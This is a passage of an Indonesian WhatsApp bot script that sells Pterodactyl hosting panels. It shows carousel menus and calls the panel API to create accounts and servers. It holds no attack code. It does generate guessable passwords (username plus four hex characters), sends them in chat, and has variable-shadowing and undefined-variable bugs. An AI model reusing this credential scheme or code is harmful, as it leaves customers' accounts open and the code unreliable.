              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv4\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv4\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qtoko})

await client.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break

case "cp1gbv4": case "cp2gbv4": case "cp3gbv4": case "cp4gbv4": case "cp5gbv4": case "cp6gbv4": case "cp7gbv4": case "cp8gbv4": case "cp9gbv4": case "cp10gbv4": case "cpunliv4": {
if (!isCreator && !isSeller) return reply(mess.seller)
if (global.panel == null) return reply('Nama/Username Tidak Di Temukan')
var ram
var disknya
var cpu
if (command == "cp1gbv4") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "cp2gbv4") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "cp3gbv4") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "cp4gbv4") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "cp5gbv4") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "cp6gbv4") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "cp7gbv4") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "cp8gbv4") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "cp9gbv4") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "cp10gbv4") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!isCreator && !isSeller) return reply(mess.seller)
let username = global.panel[0].toLowerCase()
let email = username+"@gmail.com"
let name = capital(username)
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *CPU :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Storage :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Seller Hanya*
        *Mengirim 1 Kali!*
* *Data Hilang/Lupa*
        *Akun, Seller Tidak Akan*
        *Bertanggung Jawab!*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Membawa Bukti Ss Chat Saat*
        *Pembelian*
`
await client.sendMessage(orang, {text: teks}, {quoted: loli})
delete global.panel
}
break

case "addpanel2": case "buatpanel2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
if (global.apikey.length < 1) return reply("Apikey Tidak Ditemukan!")
if (!args[0]) return reply(example("nama,628xx"))
if (!text.split(",")) return reply(example("nama,628xx"))
var buyyer = text.split(",")[0].toLowerCase()
if (!buyyer) return reply(example("nama,628xx"))
var ceknya = text.split(",")[1]
if (!ceknya) return reply(example("nama,628xx"))
var client = text.split(",")[1].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
var check = await client.onWhatsApp(ceknya)
if (check.length < 1) return reply("Nomor Buyyer Tidak Valid!")
global.panel2 = [buyyer, client]
let imgnya = await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/5xwxv6.jpg' }}, { upload: client.waUploadToServer })
global.panel = [text.toLowerCase()]
const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "Silahkan Pilih Ram Server Panel Yang Tersedia Di Bawah Ini"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: [
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *1GB*
* CPU Server *40%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 1GB\",\"title\":\"Create\",\"id\":\".cp1gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *2GB*
* CPU Server *60%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 2GB\",\"title\":\"Create\",\"id\":\".cp2gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *3GB*
* CPU Server *80%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
 text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 3GB\",\"title\":\"Create\",\"id\":\".cp3gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *4GB*
* CPU Server *100%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 4GB\",\"title\":\"Create\",\"id\":\".cp4gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *5GB*
* CPU Server *120%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 5GB\",\"title\":\"Create\",\"id\":\".cp5gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *6GB*
* CPU Server *140%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 6GB\",\"title\":\"Create\",\"id\":\".cp6gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *7GB*
* CPU Server *160%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 7GB\",\"title\":\"Create\",\"id\":\".cp7gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *8GB*
* CPU Server *180%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 8GB\",\"title\":\"Create\",\"id\":\".cp8gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *9GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 9GB\",\"title\":\"Create\",\"id\":\".cp9gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *10GB*
* CPU Server *220%*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram 10GB\",\"title\":\"Create\",\"id\":\".cp10gbv5\"}"
                  }
                ]
              })
            },
            {
              body: proto.Message.InteractiveMessage.Body.fromObject({
                text: `*Spesifikasi Server Panel :*

* Status Server *Ready ✅*
* Ram Server *Unlimited*
* CPU Server *Unlimited*`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
text: "© Powered By "+botname2
 }),
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: false,
                ...imgnya
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {
                    name: "quick_reply",
                    buttonParamsJson: "{\"display_text\":\"Create Server Ram Unlimited\",\"title\":\"Create\",\"id\":\".cpunliv5\"}"
                  }
                ]
              })
            }
          ]
        })
      })
    }
  }
}, {userJid: m.sender, quoted: qtoko})


await client.relayMessage(msgii.key.remoteJid, msgii.message, {
  messageId: msgii.key.id
})
}
break

case 'setppbot': {
if (!isCreator) return reply(mess.owner)
if (!quoted) return reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (!/image/.test(mime)) return reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (/webp/.test(mime)) return reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
let media = await client.downloadAndSaveMediaMessage(quoted)
await client.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
reply('Sukses mengganti pp bot!')
}
break

case "addaksesgrub": case "addaksesgc": {
if (!isCreator) return reply(mess.owner)
if (!m.isGroup) return reply(mess.group)
const input = m.chat
if (seller.includes(input)) return reply(`Grup ini sudah di beri akses reseller panel!`)
seller.push(input)
await fs.writeFileSync("./storage/database/reseller.json", JSON.stringify(seller, null, 2))
reply(`Berhasil menambah grup reseller panel ✅`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listaksesgrub": case "listaksesgc": {
if (seller.length < 1) return reply("Tidak ada user reseller")
let teks = `\n *乂 List all grup reseller panel*\n`
for (let i of seller) {
let name = (await client.groupMetadata(i)).subject || "Tidak ditemukan"
teks += `\n* ${i}
* *Nama :* ${name}\n`
}
client.sendMessage(m.chat, {text: teks, mentions: []}, {quoted: loli})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delaksesgrub": case "delaksesgc": {
if (!isCreator) return reply(mess.owner)
if (seller.length < 1) return reply("Tidak ada grup reseller panel")
if (!text) {
let list = []
for (let i of seller) {
let name = (await client.groupMetadata(i)).subject || "Tidak ditemukan"
list.push({
title: `${name}`, 
description: i, 
id: `.${command} ${i}`
})
}
list.push({
title: `All Group Reseller`, 
description: "All group reseller", 
id: `.${command} all`
})
return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
let input = text
if (text == "all") {
await seller.splice(0, seller.length)
await fs.writeFileSync("./storage/database/reseller.json", JSON.stringify(seller, null, 2))
return reply(`Berhasil menghapus semua grup reseller panel ✅`)
}
if (!seller.includes(input)) return reply(`Grup ini bukan grup reseller panel!`)
let posi = seller.indexOf(input)
await seller.splice(posi, 1)
await fs.writeFileSync("./storage/database/reseller.json", JSON.stringify(seller, null, 2))
reply(`Berhasil menghapus grup reseller panel ✅`)
}
break

case "addserverpanel": case "addserver": {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(example(`domain(contoh client.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
if (!text.split("|")) return reply(example(`domain(contoh client.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let dt = text.split('|')
if (dt.length < 6) return reply(example(`domain(contoh client.com)|egg(contoh 15)|nestid(contoh 5)|locid(contoh 1)|ptla|ptlc`))
let [dom, eg, nest, locc, ptla, ptlc] = dt
const natalia = {
"domain": `https://${dom}`, 
"egg": eg, 
"nestid": nest, 
"loc": loc, 
"apikey": ptla, 
"capikey": ptlc
}
serverpanel.push(natalia)
await fs.writeFileSync("./source/settingpanel.json", JSON.stringify(serverpanel, null, 2))
reply(`Berhasil menambah server panel *${dom}*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listserverpanel": {
if (!isCreator) return reply(mess.owner)
if (serverpanel.length < 1) return reply("Tidak ada server panel")
let tt = 0
let teks = "\n *── List all server panel*\n"
await serverpanel.forEach(e => teks += `\n* ${tt += 1}. ${e.domain.split("https://")[1]}\n`)
reply(`${teks}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "delserverpanel": case "delserver": {
if (!isCreator) return reply(mess.owner)
if (serverpanel.length < 1) return reply("Tidak ada server panel")
if (!args[0]) {
let list = []
let v = 0
for (let i of serverpanel) {
list.push({
title: `${i.domain.split("https://")[1]}`, 
id: `.${command} ${v += 1}`
})
}

list.push({
title: `All Server Panel`,
id: `.${command} all`
})

return client.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server',
          sections: [
            {
              title: `List All Server`,
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: loli})
}
if (!text) return reply(example("server\n\nuntuk melihat list server ketik *.listserver*\ncontoh *.delserver* 2"))
if (args[0] == "all") {
await serverpanel.splice(0, serverpanel.length)
await fs.writeFileSync("./source/settingpanel.json", JSON.stringify(serverpanel, null, 2))
return reply(`Berhasil menghapus semua server panel`)
}
if (Number(text) > serverpanel.length) return reply("Server panel tidak ditemukan")
let dom = serverpanel[Number(text) - 1].domain
await serverpanel.splice((Number(text) - 1), 1)
await fs.writeFileSync("./source/settingpanel.json", JSON.stringify(serverpanel, null, 2))
reply(`Berhasil menghapus server panel *${dom.split("https://")[1]}*`)
}
break

case "cpanel-v2": {
if (!isCreator && !isSellerr) return reply(mess.seller2)
if (!q) return reply(example("username"));
    global.panel = [text.toLowerCase()]
let teks = `Pilih Ram Panel Dibawah ini`
const sections = [{
	    	title: '𝑫𝒂𝒏𝒏𝒚 </> 𝑺𝒖𝒑𝒆𝒓𝒊𝒐𝒓',
	    	highlight_label: "🎭꙳͙͡༑ᐧ ̬𝙎𝙞𝙢𝙥𝙡𝙚 𝘽𝙤𝙩 𝙑𝟏𝟏 ̬꙳͙͡༑ᐧ〽️",
	    	rows: [{
	    		title: "1GB SERVER 2", description: "Create Ram 1GB", id: ".1gb2"
	    	}]
	    }, {	    	
	    	rows: [{
	    		title: "2GB SERVER 2", description: "Create Ram 2GB", id: ".2gb2"
	    	}, {
	    		title: "3GB SERVER 2", description: "Create Ram 3GB", id: ".3gb2"
	    	},
	    	{
	    		title: "4GB SERVER 2", description: "Create Ram 4GB", id: ".4gb2"
	    	},
	    	{
	    		title: "5GB SERVER 2", description: "Create Ram 5GB", id: ".5gb2"
	    	},
	    	{
	    		title: "6GB SERVER 2", description: "Create Ram 6GB", id: ".6gb2"
	    	},
	    	{
	    		title: "7GB SERVER 2", description: "Create Ram 7GB", id: ".7gb2"
	    	},
	    	{
	    		title: "8GB SERVER 2", description: "Create Ram 8GB", id: ".8gb2"
	    	},
	    	{
	    		title: "9GB SERVER 2", description: "Create Ram 9GB", id: ".9gb2"
	    	},
	    	{
	    		title: "10GB SERVER 2", description: "Create Ram 10GB", id: ".10gb2"
	    	},
	    	{
	    		title: "UNLIMITED SERVER 2", description: "Create Ram Unlimited", id: ".unli2"
	    	}]
	    }]
	    
	    let listMessage = {
	    	title: "options",
	    	sections
	    }

const Vyunicos = [
{ buttonId: '.menu', buttonText: { displayText: '𝐂𝐨𝐫𝐞˚𝐒𝐲𝐬𝐭𝐞𝐦', }, type: 1, nativeFlowInfo: { name: 'single_select', paramsJson: JSON.stringify(listMessage), }, viewOnce: true, }
                ]
                
                client.sendMessage(m.chat, {
                	    image: fs.readFileSync("./source/media/Xyz.jpg"),
                	    caption: teks, 
                    	footer: global.footer,
                    	buttons: Vyunicos,
                	    headerType: 1,
                	    viewOnce: true,
                    }, { quoted: loli })
}
break  

case "1gb1": case "2gb1": case "3gb1": case "4gb1": case "5gb1": case "6gb1": case "7gb1": case "8gb1": case "9gb1": case "10gb1": case "unlimited1": case "unli1": {
if (!isCreator && !isSeller) return reply(mess.seller)
if (global.panel == undefined) return reply('Username tidak ditemukan!')
var ram
var disknya
var cpu

if (command == "1gb1") {
    ram = "1000";
    disknya = "1000";
    cpu = "40";
} else if (command == "2gb1") {
    ram = "2000";
    disknya = "1000";
    cpu = "60";
} else if (command == "3gb1") {
    ram = "3000";
    disknya = "2000";
    cpu = "80";
} else if (command == "4gb1") {
    ram = "4000";
    disknya = "2000";
    cpu = "100";
} else if (command == "5gb1") {
    ram = "5000";
    disknya = "3000";
    cpu = "120";
} else if (command == "6gb1") {
    ram = "6000";
    disknya = "3000";
    cpu = "140";
} else if (command == "7gb1") {
    ram = "7000";
    disknya = "4000";
    cpu = "160";
} else if (command == "8gb1") {
    ram = "8000";
    disknya = "4000";
    cpu = "180";
} else if (command == "9gb1") {
    ram = "9000";
    disknya = "5000";
    cpu = "200";
} else if (command == "10gb1") {
    ram = "10000";
    disknya = "5000";
    cpu = "220";
} else {
    ram = "0";
    disknya = "0";
    cpu = "0";
}

let username = global.panel[0].toLowerCase()
let email = username + "@gmail.com";
let name = capital(username) + " Server";
let password = username + crypto.randomBytes(2).toString('hex');

// Sisa kode tetap sama seperti semula...
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (m.isGroup) {
orang = m.sender
await reply("*Succes Created Akun Panel*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
